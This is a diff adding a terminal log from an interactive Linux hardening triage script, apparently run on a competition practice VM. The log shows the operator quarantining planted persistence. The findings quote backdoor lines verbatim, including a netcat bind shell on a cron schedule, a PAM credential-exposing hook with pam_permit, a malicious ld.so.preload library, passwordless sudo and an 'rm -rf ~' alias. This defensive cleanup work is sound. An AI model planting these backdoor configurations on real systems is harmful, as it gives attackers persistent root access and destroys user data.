@@ -1,0 +1,229 @@
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+Baseline triage: 12 FIX NOW, then 7 REVIEW (asked once). Type a key + Enter; Enter alone = the [default];
+x = exit. Every change is backed up, quarantine moves files to /root/cp-quarantine (undo in INDEX.txt), services are re-checked.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 1/19[0m  [1;31mFIX NOW[0m  [ssh]  file no package owns: 644 root:root /etc/ssh/sshd_config.d/60-evil.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      PermitRootLogin yes
+      -> quarantine (q) unless the README needs it
+  60-evil.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m ssh.service restarted and active
+  [1;32m[+][0m quarantined /etc/ssh/sshd_config.d/60-evil.conf -> /root/cp-quarantine/etc/ssh/sshd_config.d/60-evil.conf   (undo: mv /root/cp-quarantine/etc/ssh/sshd_config.d/60-evil.conf /etc/ssh/sshd_config.d/60-evil.conf)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 2/19[0m  [1;31mFIX NOW[0m  [vsftpd]  vsftpd.service has a drop-in no package owns: /etc/systemd/system/vsftpd.service.d/cptest-noipv6.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      [Service]
+      ExecStart=
+      ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf -olisten=YES -olisten_ipv6=NO
+      -> quarantine (q) if planted (unit is restarted and checked)
+  cptest-noipv6.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > s
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 3/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/sysctl.d/99-zz-net.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      net.ipv4.ip_forward = 1
+      -> quarantine (q) unless the README needs it
+  99-zz-net.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined /etc/sysctl.d/99-zz-net.conf -> /root/cp-quarantine/etc/sysctl.d/99-zz-net.conf   (undo: mv /root/cp-quarantine/etc/sysctl.d/99-zz-net.conf /etc/sysctl.d/99-zz-net.conf)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 4/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 440 root:root /etc/sudoers.d/90-cloud-init-users
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      bob ALL=(ALL) NOPASSWD: ALL
+      -> quarantine (q) unless the README needs it
+  90-cloud-init-users: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined /etc/sudoers.d/90-cloud-init-users -> /root/cp-quarantine/etc/sudoers.d/90-cloud-init-users   (undo: mv /root/cp-quarantine/etc/sudoers.d/90-cloud-init-users /etc/sudoers.d/90-cloud-init-users)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 5/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/lightdm/lightdm.conf.d/80-autologin.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      [Seat:*]
+      autologin-user = nancy
+      -> quarantine (q) unless the README needs it
+  80-autologin.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined /etc/lightdm/lightdm.conf.d/80-autologin.conf -> /root/cp-quarantine/etc/lightdm/lightdm.conf.d/80-autologin.conf   (undo: mv /root/cp-quarantine/etc/lightdm/lightdm.conf.d/80-autologin.conf /etc/lightdm/lightdm.conf.d/80-autologin.conf)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 6/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/lightdm/lightdm.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      [Seat:*]
+      autologin-user=bob
+      autologin-user-timeout=0
+      -> quarantine (q) unless the README needs it
+  lightdm.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=skip] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 7/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/ld.so.preload - preloads: /usr/src/evil_rabbit.so
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      preloads /usr/src/evil_rabbit.so  (no package owns it - quarantined together with this file)
+      -> quarantine (q) = this file + the unowned libraries it lists
+  ld.so.preload: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined preloaded library /usr/src/evil_rabbit.so -> /root/cp-quarantine/usr/src/evil_rabbit.so
+  [1;32m[+][0m quarantined /etc/ld.so.preload -> /root/cp-quarantine/etc/ld.so.preload   (undo: mv /root/cp-quarantine/etc/ld.so.preload /etc/ld.so.preload)
+
+[1;36m--- 8/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/cron.d/0hourly-sync
+      * * * * * root /bin/nc.traditional -l -p 4444 -e /bin/bash >/dev/null 2>&1
+      -> quarantine (q) unless the README needs it
+  0hourly-sync: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+  [1;32m[+][0m quarantined /etc/cron.d/0hourly-sync -> /root/cp-quarantine/etc/cron.d/0hourly-sync   (undo: mv /root/cp-quarantine/etc/cron.d/0hourly-sync /etc/cron.d/0hourly-sync)
+
+[1;36m--- 9/19[0m  [1;31mFIX NOW[0m  [system]  unit file no package owns: /etc/systemd/system/system-sync.service
+      ExecStart=/usr/bin/python3 -m http.server 31337 --directory /
+      -> quarantine (q) = stop + disable + move, unless the README needs it
+  system-sync.service: d=show  q=quarantine (stop+disable+move)  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+  [1;32m[+][0m stopped + disabled system-sync.service
+  [1;32m[+][0m quarantined /etc/systemd/system/system-sync.service -> /root/cp-quarantine/etc/systemd/system/system-sync.service   (undo: mv /root/cp-quarantine/etc/systemd/system/system-sync.service /etc/systemd/system/system-sync.service)
+
+[1;36m--- 11/19[0m  [1;31mFIX NOW[0m  [system]  unexpected listener: tcp 0.0.0.0:23  inetd (pid 262)
+      cmd: /usr/sbin/inetd 
+      unit: inetd.service
+      -> kill/stop it (k) unless the README needs it; also check cron + units
+  pid 262: d=show  k=kill/stop  s=skip  x=exit  [Enter=skip] > k
+  stop + disable inetd.service (pid 262: /usr/sbin/inetd )? [y/N] y
+  [1;32m[+][0m stopped + disabled inetd.service (undo: systemctl enable --now inetd.service)
+
+[1;36m--- 12/19[0m  [1;31mFIX NOW[0m  [system]  unexpected listener: tcp 0.0.0.0:4444  nc.traditional (pid 437)
+      cmd: /bin/nc.traditional -l -p 4444 -e /bin/bash 
+      unit: cron.service
+      -> kill/stop it (k) unless the README needs it; also check cron + units
+  pid 437: d=show  k=kill/stop  s=skip  x=exit  [Enter=kill] > k
+  kill pid 437 (/bin/nc.traditional -l -p 4444 -e /bin/bash )? [Y/n] y
+  [1;32m[+][0m killed 437 - if it comes back, find what starts it (cron, unit, rc.local)
+
+  REVIEW = config/perms that differ from the default. The hardening scripts fix most of these later.
+  Also go through the 7 REVIEW item(s)? [y/N] y
+
+[1;36m--- 13/19[0m  [1;33mREVIEW[0m  [ssh]  /etc/ssh/sshd_config differs from pristine (2 line(s))
+      + PermitRootLogin yes
+      + PermitEmptyPasswords yes
+      -> restore (r) or edit (e); ssh.sh hardens it
+  sshd_config: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  /etc/ssh/sshd_config can hold README-required settings (users, shares, ports, sites, zones). Restore the default anyway? [y/N] y
+  [1;32m[+][0m ssh.service restarted and active
+  [1;32m[+][0m restored default content of /etc/ssh/sshd_config  (backup: /root/cp-backups/20261112_021120/etc/ssh/sshd_config)
+
+[1;36m--- 14/19[0m  [1;33mREVIEW[0m  [ssh]  config file not owned by root: 644 bob:root /etc/ssh/sshd_config  (clean VM: 644 root:root)
+      -> fix (f) -> 644 root:root; ssh.sh hardens it
+      (changed since the scan - e.g. by a hardening script; default is skip)
+  sshd_config: d=show  f=fix -> 644 root:root  s=skip  x=exit  [Enter=skip] > f
+  [1;32m[+][0m /etc/ssh/sshd_config is now 644 root:root   (undo: /root/cp-backups/20261112_021120/PERMS-UNDO.sh)
+
+[1;36m--- 15/19[0m  [1;33mREVIEW[0m  [system]  /etc/sudoers differs from pristine (2 line(s))
+      + Defaults !env_reset
+      + Defaults env_keep += "PATH"
+      -> restore (r) or edit (e); usersandsudo.sh checks sudoers
+  sudoers: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/sudoers  (backup: /root/cp-backups/20261112_021120/etc/sudoers)
+
+[1;36m--- 16/19[0m  [1;33mREVIEW[0m  [system]  /etc/sysctl.conf differs from pristine (7 line(s))
+      + net.ipv4.tcp_syncookies=0
+      + net.ipv4.ip_forward=1
+      + net.ipv4.conf.all.accept_source_route = 1
+      + net.ipv4.conf.all.send_redirects=1
+      + net.ipv4.conf.all.accept_redirects = 1
+      + kernel.randomize_va_space=0
+      ... 1 more (full diff: --review d, or diff.patch)
+      -> restore (r) or edit (e); systemconfig.sh also hardens this
+  sysctl.conf: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/sysctl.conf  (backup: /root/cp-backups/20261112_021120/etc/sysctl.conf)
+
+[1;36m--- 17/19[0m  [1;33mREVIEW[0m  [system]  /etc/login.defs changed since install (login) - no pristine copy to compare
+      -> open it (e) and check every setting; systemconfig.sh also hardens this
+  login.defs: d=show  e=edit  s=skip  x=exit  [Enter=skip] > 
+
+[1;36m--- 18/19[0m  [1;33mREVIEW[0m  [system]  /etc/bash.bashrc differs from pristine (1 line(s))
+      + alias GOODBYE='rm -rf ~'
+      -> restore (r) or edit (e); systemconfig.sh also hardens this
+  bash.bashrc: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/bash.bashrc  (backup: /root/cp-backups/20261112_021120/etc/bash.bashrc)
+
+[1;36m--- 19/19[0m  [1;33mREVIEW[0m  [system]  /etc/pam.d/common-auth differs from pristine (3 line(s))
+      + auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+      - auth requisite   pam_deny.so
+      + auth requisite   pam_permit.so
+      -> restore (r) or edit (e); systemconfig.sh also hardens this
+  common-auth: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/pam.d/common-auth  (backup: /root/cp-backups/20261112_021120/etc/pam.d/common-auth)
+
+  [1;32m[+][0m Triage done: 15 changed, 3 skipped, 1 already resolved.
+  Backups: /root/cp-backups/20261112_021120   Quarantine: /root/cp-quarantine/INDEX.txt
+  Re-scan to confirm: sudo bash services/baseline.sh 
+
+[drive2] EXIT 0
